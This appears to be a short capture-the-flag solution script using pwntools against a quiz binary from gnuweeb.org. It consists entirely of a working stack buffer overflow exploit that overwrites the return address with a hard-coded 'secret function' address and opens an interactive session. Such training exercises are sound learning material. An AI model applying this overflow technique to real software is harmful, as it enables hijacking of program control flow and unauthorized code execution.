# Download quiz : https://gnuweeb.org/quiz/003

from pwn import *

a = process("./003")

sec_func = p64(0x04010B9) # secret function offset
payload =  "\x41" * 504 + "\xff" * 8 + sec_func

a.sendline(payload)
a.interactive()
